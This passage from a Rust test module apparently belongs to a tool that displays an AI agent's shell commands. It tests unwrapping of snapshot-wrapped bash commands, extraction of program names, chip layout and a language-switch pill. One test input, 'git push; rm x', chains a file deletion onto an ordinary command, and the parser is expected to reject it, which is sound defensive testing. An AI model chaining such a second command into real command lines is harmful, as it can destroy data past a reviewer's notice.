        let jp = r#"bash -c "source /c/Users/太郎/.claude/shell-snapshots/snapshot-bash-1-x.sh 2>/dev/null || true && eval 'git push'""#;
        assert_eq!(unwrap(jp).0, "git push", "a home that is not ASCII");
    }

    #[test]
    fn the_name_in_the_line_about_how_long() {
        assert_eq!(
            program_name("git push origin fix/login").as_deref(),
            Some("git push")
        );
        assert_eq!(program_name("ssh-add -l").as_deref(), Some("ssh-add"));
        assert_eq!(
            program_name(r"C:\x\ssh.exe -T host").as_deref(),
            Some("ssh")
        );
        assert_eq!(
            program_name("git -C ~/src/infra fetch").as_deref(),
            Some("git")
        );
        assert_eq!(
            program_name("ansible-playbook site.yml").as_deref(),
            Some("ansible-playbook")
        );
        assert_eq!(program_name("cd a && git push"), None);
        assert_eq!(program_name("git push; rm x"), None);
        assert_eq!(
            program_name("echo 'a && b'").as_deref(),
            Some("echo"),
            "inside quotes"
        );
        assert_eq!(program_name(""), None);
    }

    #[test]
    fn chips_flow_onto_rows() {
        assert_eq!(
            flow(&[100.0, 120.0, 200.0], 300.0, 6.0),
            vec![(0, 0.0), (0, 106.0), (1, 0.0)]
        );
        assert_eq!(
            flow(&[50.0, 400.0, 50.0], 300.0, 6.0),
            vec![(0, 0.0), (1, 0.0), (2, 0.0)],
            "too wide: a row of its own"
        );
        assert_eq!(flow(&[400.0], 300.0, 6.0), vec![(0, 0.0)]);
        assert!(flow(&[], 300.0, 6.0).is_empty());
    }

    #[test]
    fn the_switch_is_a_pill_whose_other_half_is_the_target() {
        let r = pill([40.0, 33.0], 9.0, 500.0, 100.0, 24.0);
        assert_eq!(
            r[1],
            Rect {
                left: 449.0,
                top: 100.0,
                right: 500.0,
                bottom: 124.0
            }
        );
        assert_eq!(r[0].right, 449.0);
        assert_eq!(r[0].left, 391.0);
        assert_eq!(pill_hit(&r, Lang::En, 474.0, 112.0), Some(Lang::Ja));
        assert_eq!(
            pill_hit(&r, Lang::Ja, 474.0, 112.0),
            None,
            "the language shown"
        );
        assert_eq!(pill_hit(&r, Lang::Ja, 420.0, 112.0), Some(Lang::En));
        assert_eq!(pill_hit(&r, Lang::En, 474.0, 124.0), None, "below");
        assert_eq!(
            pill_hit(&r, Lang::En, 500.0, 112.0),
            None,
            "past the right edge"
        );
    }
}
